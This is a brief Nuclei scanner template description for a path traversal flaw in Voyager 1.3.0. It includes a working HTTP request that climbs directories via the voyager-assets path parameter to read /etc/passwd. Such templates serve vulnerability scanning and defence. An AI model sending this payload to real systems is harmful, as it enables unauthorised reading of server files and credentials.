# Nuclei Template: Voyager 1.3.0 - Directory Traversal
**Template ID:** voyager-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`voyager-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Voyager 1.3.0 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd
```

## References
- https://www.exploit-db.com/exploits/47875
